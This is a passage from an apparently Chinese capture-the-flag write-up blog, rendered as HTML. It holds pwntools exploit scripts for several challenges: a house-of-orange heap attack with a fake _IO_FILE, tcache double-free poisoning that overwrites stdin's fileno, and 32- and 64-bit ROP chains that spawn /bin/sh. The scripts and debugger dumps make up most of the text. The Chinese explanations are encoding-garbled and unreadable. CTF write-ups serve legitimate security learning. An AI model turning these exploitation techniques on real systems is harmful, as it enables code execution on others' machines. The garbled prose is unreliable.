</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>heap</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>free_hook</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>storage</span><span class=o>+</span><span class=mh>0x50</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=houseoforange_hitcon_2016 class="relative group">houseoforange_hitcon_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#houseoforange_hitcon_2016 aria-label=é”šç‚¹>#</a></span></h3><pre tabindex=0><code>pwndbg&gt; p *(struct _IO_FILE*)0x555b7d04b4f0
$2 = {
  _flags = 1852400175,
  _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
  _IO_read_end = 0x0,
  _IO_read_base = 0x7f29a0f30510 &#34;&#34;,
  _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
  _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 &#39;\000&#39;,
  _shortbuf = &#34;&#34;,
  _lock = 0x0,
  _offset = 0,
  _codecvt = 0x0,
  _wide_data = 0x0,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
}
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>useless</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mh>0x1f00000001</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>useless</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0xfa1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span> <span class=c1># corrupt top chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>)</span> <span class=c1># old_top -&gt; unsorted</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span> <span class=c1># slice old top</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mi>1640</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>io_list_all</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;large chunk:
</span></span></span><span class=line><span class=cl><span class=s1>0x56512e53b0c0:    0x0000000000000000 0x0000000000000411
</span></span></span><span class=line><span class=cl><span class=s1>0x56512e53b0d0:    0x6161616161616161    0x00007f01ea979188
</span></span></span><span class=line><span class=cl><span class=s1>0x56512e53b0e0:    0x000056512e53b0c0    0x000056512e53b0c0
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0xc0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># jump_table+0x18</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>system</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x400</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>useless</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>io_list_all</span><span class=o>-</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xd8</span><span class=o>-</span><span class=mh>0x30</span><span class=p>),</span><span class=n>heap</span><span class=o>+</span><span class=mh>0xd0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_final_2 class="relative group">ciscn_2019_final_2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_final_2 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜éœ€è¦å°†è¯»å…¥çš„ <code>flag</code> çš„ <code>fd</code> æ”¹ä¸º 666ã€‚</p><p>å­˜åœ¨ tcache double free æ¼æ´ï¼Œé¦–å…ˆåˆ†é…å¤šä¸ª <code>short</code>ï¼Œåˆ©ç”¨ double free æ³„éœ²å †åœ°å€ã€‚ç„¶å tcache æŠ•æ¯’ï¼Œä¼ªé€  <code>chunk0</code> å¤§å°ï¼Œå¹¶é‡Šæ”¾è¿›å…¥ unsorted bin æ³„éœ² libcã€‚æ³¨æ„é‡Šæ”¾å‰å…ˆå¡«æ»¡ tcache æ‰èƒ½è¿›å…¥ unsorted binã€‚</p><p>æ¥ä¸‹æ¥ç»§ç»­æŠ•æ¯’ä½¿ <code>int</code> çš„ <code>fd</code> æŒ‡å‘ <code>fileno</code>ï¼Œå†æ¬¡ double free æ³„éœ² <code>chunk0</code> çš„ <code>mem</code> æŒ‡é’ˆåœ°å€ã€‚æœ€åæŠ•æ¯’æŒ‡å‘ <code>chunk0</code> çš„ <code>mem</code> æŒ‡é’ˆåœ°å€ï¼Œå†ç”³è¯·ä¸‰æ¬¡å°±å¯ä»¥ä¿®æ”¹ <code>fileno</code> äº†ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span> <span class=c1># total size: 0x90</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span> <span class=c1># prevent merging</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number :&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk0</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0xa0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chunk0&#39;</span><span class=p>,</span><span class=n>chunk0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>chunk0</span><span class=p>)</span> <span class=c1># poisoning</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x91</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span> <span class=c1># fill tcache</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># unsorted</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number :&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mi>96</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fileno</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdin_&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x70</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>fileno</span><span class=p>)</span> <span class=c1># poisoning</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number :&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk0_mem</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x30</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>chunk0_mem</span><span class=p>)</span> <span class=c1># poisoning</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>666</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=mi>4</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=å¼ºç½‘æ¯_æ‹Ÿæ€_stkof class="relative group">å¼ºç½‘æ¯_æ‹Ÿæ€_stkof <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e5%bc%ba%e7%bd%91%e6%9d%af_%e6%8b%9f%e6%80%81_stkof aria-label=é”šç‚¹>#</a></span></h3><p>é‡‡ç”¨äº†æ‹Ÿæ€é˜²å¾¡ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¦ç”¨åŒä¸€ä¸ªè„šæœ¬åŒæ—¶åœ¨ 32 ä½å’Œ 64 ä½ç¨‹åºä¸Š getshell ä¸”ä¸¤ä¸ªç¨‹åºçš„è¾“å‡ºå¿…é¡»ç›¸åŒã€‚</p><p>é¦–å…ˆæ£€æŸ¥ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¼æ´éƒ½æ˜¯ç®€å•çš„æ ˆæº¢å‡ºå¹¶ä¸”ç©ºé—´å¾ˆå¤§ã€‚åŒºåˆ«åœ¨äºå¯ä»¥æº¢å‡ºçš„é•¿åº¦ç›¸å·® 8 å­—èŠ‚ï¼Œè¿™ 8 å­—èŠ‚åº”è¯¥å°±æ˜¯èƒ½å¤Ÿç”¨åŒä¸€ä¸ªè„šæœ¬çš„å…³é”®æ‰€åœ¨ã€‚</p><p>å®¹æ˜“æƒ³åˆ°åˆ©ç”¨å¸¸è§„ ret2syscallï¼Œåˆ†åˆ«å†™å‡º 32 ä½å’Œ 64 ä½è„šæœ¬ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_eax</span> <span class=o>=</span> <span class=mh>0x80a8af6</span>
</span></span><span class=line><span class=cl><span class=n>pop_dcb</span> <span class=o>=</span> <span class=mh>0x806e9f1</span>
</span></span><span class=line><span class=cl><span class=n>int_80</span> <span class=o>=</span> <span class=mh>0x80495a3</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=mh>0x80d7000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain86</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x10c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_eax</span><span class=p>,</span><span class=mh>0xb</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>int_80</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain86</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rax</span> <span class=o>=</span> <span class=mh>0x43b97c</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x4005f6</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=mh>0x405895</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx</span> <span class=o>=</span> <span class=mh>0x43b9d5</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x461645</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=mh>0x6a4e40</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain64</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x110</span><span class=o>+</span><span class=mi>8</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi</span><span class=p>,</span><span class=n>data</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>é‚£ä¹ˆæ€ä¹ˆæŠŠä¸¤è€…åˆå¹¶å‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° 8 å­—èŠ‚çš„æ ˆæº¢å‡ºé•¿åº¦å·®ï¼Œåœ¨è¿™ 8 å­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«è°ƒæ•´ 32 ä½ç¨‹åºå’Œ 64 ä½ç¨‹åºçš„ <code>esp</code> å’Œ <code>rsp</code> æŒ‡é’ˆï¼Œä½¿å¾—ç»è¿‡è°ƒæ•´åæ ˆä¸Šçš„è¿”å›åœ°å€æŒ‡å‘ payload çš„ä¸åŒéƒ¨åˆ†ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ ˆå˜é‡åœ¨ 32 ä½ä¸‹ä½äº <code>esp+0xc</code>ï¼Œåœ¨ 64 ä½ä¸‹ä½äº <code>rsp+0x0</code>ï¼Œåœ¨è®¡ç®—éœ€è¦å¡«å……çš„ padding æ—¶éœ€è¦è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_eax</span> <span class=o>=</span> <span class=mh>0x80a8af6</span>
</span></span><span class=line><span class=cl><span class=n>pop_dcb</span> <span class=o>=</span> <span class=mh>0x806e9f1</span>
</span></span><span class=line><span class=cl><span class=n>int_80</span> <span class=o>=</span> <span class=mh>0x80495a3</span>
</span></span><span class=line><span class=cl><span class=n>data86</span> <span class=o>=</span> <span class=mh>0x80d7000</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=mh>0x806c8e0</span>
</span></span><span class=line><span class=cl><span class=n>add_esp_20</span> <span class=o>=</span> <span class=mh>0x80a69f2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset86</span> <span class=o>=</span> <span class=mh>0x20</span><span class=o>-</span><span class=mh>0xc</span> <span class=c1># esp+0xc</span>
</span></span><span class=line><span class=cl><span class=n>chain86</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>offset86</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data86</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span>
